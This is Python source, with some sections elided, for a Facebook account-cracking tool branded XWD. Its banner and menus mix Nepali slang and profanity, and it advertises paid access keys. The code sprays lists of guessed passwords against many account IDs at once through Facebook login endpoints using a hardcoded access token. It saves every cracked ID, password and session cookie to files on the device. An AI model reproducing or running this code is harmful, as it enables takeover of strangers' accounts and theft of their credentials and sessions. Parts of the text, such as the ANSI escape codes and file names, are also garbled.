...
# Facebook : https://www.facebook.com/XWD BRAND
from os import path
...
logo=("""\033[1;37m
\033[31m ____  _____      __________   
\033[33m\   \/  /  \    /  \______ \  
033[32m \     /\   \/\/   /|    |  \ 
 033[36m/     \ \        / |    `   \
033[34m/___/\  \ \__/\  / /_______  /
 033[1;37m     \_/      \/          \/ 
••••••••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;37m [@] \033[1;37mOwner     :   FUCKUU DADA👽   |•|
 [@] Facebook  :   XWD BRAND 🔥 |•|
 [@] Tool      :   PAID��FREE           |•|
...
def menu():
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m \x1b[38;5;208mUSE AIRPLANE MODE USE GARANA GAR VAI SPEED UP HUNXA\033[1;37m")
                                        linex()
                                        for user in fo:
                                ...
                                print('\033[1;37m')
                                linex()
                                print(' muji clone completed vayoo')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' muji enter han back hunxa  ')
                                os.system('python FACKUU.py')
                        elif xd in ['2','02']:                               
                                print("next update")
                        elif xd in ['3','03']:
                                clear()
...
def za():
    ...
    if myid in str(body):
        ...
        tp=0
        print("\33[1;37m Read note first bro...!\33[1;37m");print(logo);print (" Validity : 30Days 600");print (" validity : \33[1;37m15days= 400\n \033[1;32mFOR OUT OF COUNTRY-----------> \n \033[1;37mValidity : 30days = 10$\33[1;37m\n \33[1;37m\33[37;41mNote: If You Are free user come to  this tool\33[0;0m");linex();print(" Your Key  :\n "+myid);linex();print(' cmd jaslai chixaa tslaa owner lai per day 100+ idz denu parxa ');linex(); print(" tool is totally freeL");linex();print('  ')
...
def npxind():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as FUCKUU:     
                        clear()
                        id = str(len(user))
                        ...
                        for psx in user:
                                ...
                                if pcs in ['1','01']:                                   
                                    ...
                                    passlist = [psx,ids,'neapl123','neapl1234','neapl12345','xatrii ko xora ma ','tamang123','maya123','maya1234','maya12345','karki 123','katmandu','1234567890','kalpana12','sagar123','freefire1234','nimesh2627','free fire','i love you','Neapl123','Neapl12345']
                                if mthd in ['1','01']:                                 
                                    FUCKUU.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    FUCKUU.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' muji enter gar back hunxa')
                os.system('python FUCKUU.py')    
def pak():
                user=[]
                clear()
                ...
                print('\033[1;37m')
                linex()
                print(' muji clone ko  process completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' muji enter gar back hunxa  ')
                os.system('python FUCKUU.py')       
...
def gmail():
                ...
                with tred(max_workers=30) as HAKUDO:
                        ...
                        print("\033[1;37m \x1b[38;5;208mAeroplane mode use garney gaar pakhey \033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                ...
                                if 'session_key' in q:
                                       ...
                                       # print("\033[1;33m [COOKIE-🍪] :\033[1;33m "+cookie)                                                   
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/XWD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/XWD-CP.txt','a').write(ids+'|'+pas+'\n')
...
def M2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [XWD-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m') 
                                        print("\033[1;96m [BISCUT-🍪] :\033[1;37m "+cookie)           
                                        open('/sdcard/XWD��_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/XWD��_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M3(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [XWD-M3] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [XWD��-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/X2D��_m3_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/K3SH9V_iDs_COOKiE_M3.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
...
def M4(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [XWD��-M4] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
'Content-Length': '706'}
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;32m [XWD��-OK] '+ids+' | '+pas+' | '+joined(uid)+'\033[1;97m')            
                                        open('/sdcard/XWD��_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/LAND CHUSS��_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                       
                                        oks.append(ids)              
                                        break                                                                         
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [XWD-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/XWD-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm1(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;32m [XWD��-M1] %s|OK-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/XWD��_V_COOKiE_M1.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/XWD-R-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [XWD-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XWD��-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def rndm(ids,passlist):
        global loop
        global oks,cps
        sys.stdout.write('\r\r\033[1;37m [XWD��-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'                        
                        facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
...
'X-Fb-Server-Cluster': 'True',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [XWD-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"  
                                        open('/sdcard/XWD��_R_COOKiE_M2.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')                                     
                                        open('/sdcard/XWD��-R-M2-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
